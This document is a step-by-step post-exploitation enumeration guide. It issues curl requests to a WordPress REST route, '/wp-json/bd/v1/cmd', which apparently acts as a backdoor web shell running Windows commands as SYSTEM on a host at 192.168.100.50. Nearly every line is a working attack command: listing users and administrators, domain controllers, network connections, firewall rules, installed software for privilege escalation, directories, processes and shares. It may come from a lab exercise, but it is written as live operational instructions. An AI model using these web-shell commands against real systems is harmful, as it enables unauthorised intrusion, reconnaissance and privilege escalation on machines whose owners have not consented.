- Basic System Information

Run:

?cmd=systeminfo


Curl:

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=systeminfo"


This gives:

Windows version

Hotfixes installed

OS build

Domain/workgroup

Architecture

Boot time

- Hostname
?cmd=hostname

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=hostname"

- Current User & Privileges

You're already SYSTEM, but confirm:

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=whoami%20/all"

- Domain / Local Users
List users
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20user"

Get details on each user
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20user%20Administrator"
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20user%20Guest"
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20user%20<username>"

- Domain / Workgroup Information
?cmd=net config workstation

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20config%20workstation"


Also:

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=nltest%20/dsgetdc:WINSERVER-01"


(Useful if domain-joined.)

- Network Information
IP configuration
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=ipconfig%20/all"

Routing table
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=route%20print"

Active connections
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=netstat%20-ano"

- Firewall Configuration
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=netsh%20advfirewall%20show%20allprofiles"

- Installed Programs (useful for privilege escalation)
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=wmic%20product%20get%20name,version"

- Directory Enumeration
Root of C:
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=dir%20C:\\"

Program Files
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=dir%20C:\\Program%20Files"

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=dir%20C:\\Program%20Files%20(x86)"

- Running Processes
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=tasklist"

- Services
curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20start"

- SMB & Shares

Normally you would use:

?cmd=net share

curl "http://192.168.100.50/wp-json/bd/v1/cmd?cmd=net%20share"
